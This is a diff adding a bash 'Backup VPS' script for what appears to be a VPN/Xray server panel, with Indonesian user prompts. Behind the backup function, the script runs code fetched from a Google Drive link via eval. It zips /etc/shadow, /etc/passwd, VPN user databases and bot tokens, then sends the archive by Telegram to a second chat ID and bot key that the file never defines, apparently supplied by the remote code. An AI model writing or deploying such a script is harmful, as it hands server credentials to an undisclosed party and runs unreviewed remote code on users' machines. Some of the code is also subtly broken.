@@ -1,0 +1,112 @@
+#!/bin/bash
+#!/bin/bash
+clear
+
+source /usr/bin/ui.sh
+
+eval "$(wget -qO- "https://drive.google.com/u/4/uc?id=1eutPTYsea7xYx1mNBWDQ_g1Yx3ZPNimF")"
+
+MYIP=$(curl -s https://ipinfo.io/ip?token=4e159274f1da8c)
+
+data_server=$(curl -v --insecure --silent https://google.com/ 2>&1 | grep Date | sed -e 's/< Date: //')
+date_list=$(date +"%Y-%m-%d" -d "$data_server")
+exp=$(curl -sS $IZIN | grep $MYIP | awk '{print $3}')
+IPCLIENT=$(curl -sS $IZIN | grep $MYIP | awk '{print $4}')
+
+if [[ "$MYIP" != "$IPCLIENT" ]]; then
+  rejected "$MYIP"
+else
+  if [[ $date_list > $exp ]] then
+    rejected "$MYIP"
+  fi
+fi
+
+CITY=$(cat /etc/xray/city)
+ISP=$(cat /etc/xray/isp)
+DOMAIN=$(cat /etc/xray/domain)
+NAME=$(cat /etc/xray/username)
+
+CHAT_ID=$(grep -E "^#backup# " "/etc/bot/.bot.db" | cut -d ' ' -f 3)
+KEY=$(grep -E "^#backup# " "/etc/bot/.bot.db" | cut -d ' ' -f 2)
+TIME="10"
+URL="https://api.telegram.org/bot$KEY/sendMessage"
+
+clear
+echo "Mohon Menunggu , Proses Backup sedang berlangsung !!"
+rm -rf /root/backup
+mkdir /root/backup
+cp /etc/passwd backup/
+cp /etc/group backup/
+cp /etc/shadow backup/
+cp /etc/gshadow backup/
+cp /etc/crontab backup/
+cp /etc/vmess/.vmess.db backup/
+cp /etc/ssh/.ssh.db backup/
+cp /etc/vless/.vless.db backup/
+cp /etc/trojan/.trojan.db backup/
+cp /etc/bot/.bot.db backup/
+cp -r /etc/kyt/limit backup/
+cp -r /etc/limit backup/qt/
+cp -r /etc/vmess backup/
+cp -r /etc/trojan backup/
+cp -r /etc/vless backup/
+cp -r /var/lib/kyt/ backup/kyt 
+cp -r /etc/xray backup/xray
+cp -r /var/www/html/ backup/html
+
+DATE=$(date +"%Y-%m-%d")
+TIME=$(date +"%H:%M:%S")
+BACKUP_NAME="$MYIP-$DATE-$TIME.zip"
+
+echo "🗜️ Membuat file backup.zip..."
+copy_backup > /dev/null 2>&1
+cd /root
+apt install zip -y > /dev/null 2>&1
+zip -r $BACKUP_NAME backup/ > /dev/null 2>&1
+
+echo "📤 Mengupload file backup.zip..."
+rclone copy /root/$BACKUP_NAME dr:backup/
+
+url=$(rclone link dr:backup/$BACKUP_NAME)
+id=(`echo $url | grep '^https' | cut -d'=' -f2`)
+# link="https://drive.google.com/u/4/uc?id=${id}&export=download"
+
+sendNotification() {
+curl -F chat_id="$1" -F document=@"$BACKUP_NAME" https://api.telegram.org/bot$2/sendDocument > /dev/null 2>&1
+curl -s -X POST "https://api.telegram.org/bot$2/sendMessage" \
+  -F chat_id="$1" \
+  -F text="◇━━━━━━━━━━━━━━◇
+     *BACKUP VPS*
+◇━━━━━━━━━━━━━━◇
+\`VPS IP  \`:\` ${MYIP}\`
+\`DOMAIN  \`:\` ${DOMAIN}\`
+\`DATE    \`:\` ${DATE}\`
+\`TIME    \`:\` ${TIME}\`
+◇━━━━━━━━━━━━━━◇
+\`${id}\`
+◇━━━━━━━━━━━━━━◇
+Silahkan copy ID dan restore di VPS baru" \
+  -F parse_mode="MarkdownV2" > /dev/null 2>&1
+}
+
+sendNotification "$CHAT_ID" "$KEY"
+sendNotification "$CHATID" "$KEYBK"
+
+rm -rf backup $BACKUP_NAME
+
+clear
+echo ""
+banner "BACKUP VPS DATA"
+echo -e "${CYAN} IP         : ${BLUE}$MYIP${RESET}"
+echo -e "${CYAN} DOMAIN     : ${BLUE}$DOMAIN${RESET}"
+echo -e "${CYAN} DATE       : ${BLUE}$DATE${RESET}"
+echo -e "${CYAN} TIME       : ${BLUE}$TIME${RESET}"
+echo -e "${CYAN} FILE ID    : ${BLUE}$id${RESET}"
+garis
+center "Please copy the ID file above and" "${YELLOW}"
+center "paste it into your new VPS" "${YELLOW}"
+garis
+echo ""
+
+read -p "Tekan Enter untuk kembali ke menu..."
+m-bkp
